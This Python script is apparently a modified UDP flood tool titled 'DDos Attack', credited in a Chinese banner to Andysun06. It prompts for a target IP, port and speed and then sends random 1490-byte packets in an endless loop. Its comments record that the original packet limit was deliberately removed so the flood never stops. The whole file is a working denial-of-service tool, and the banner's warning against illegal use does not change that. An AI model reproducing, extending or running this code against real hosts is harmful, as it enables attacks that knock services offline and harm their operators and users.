import sys
import os
import time
import socket
import random
# Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print(" ")
print("/---------------------------------------------------\ ")
print("|   作者          : Andysun06                       |")
print("|   作者github    : https://github.com/Andysun06    |")
print("|   kali-QQ学习群 : 909533854                       |")
print("|   版本          : V1.1.0                          |")
print("|   严禁转载，程序教程仅发布在CSDN（用户Andysun06）   |")
print("\---------------------------------------------------/")
print(" ")
print(" -----------------[请勿用于违法用途]----------------- ")
print(" ")
ip = input("请输入 IP     : ")
port = int(input("攻击端口      : "))
sd = int(input("攻击速度(1~1000000) : "))  # Updated range to 1~1,000,000

# Ensure sd stays within valid range
if sd < 1 or sd > 1000000:
    print("攻击速度必须在1到1000000之间！")
    sys.exit(1)

os.system("clear")

sent = 0
# 移除最大数据包限制 (原来是 max_packets = 1000000)
while True:  # 改为无限循环
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    print("已发送 %s 个数据包到 %s 端口 %d" % (sent, ip, port))
    time.sleep((1000000 - sd) / 2000000)  # Adjusted delay formula for new range

# 移除完成提示，因为永远不会结束
# 原代码: print(f"已完成发送 {max_packets} 个数据包到 {ip} 端口 {port}")
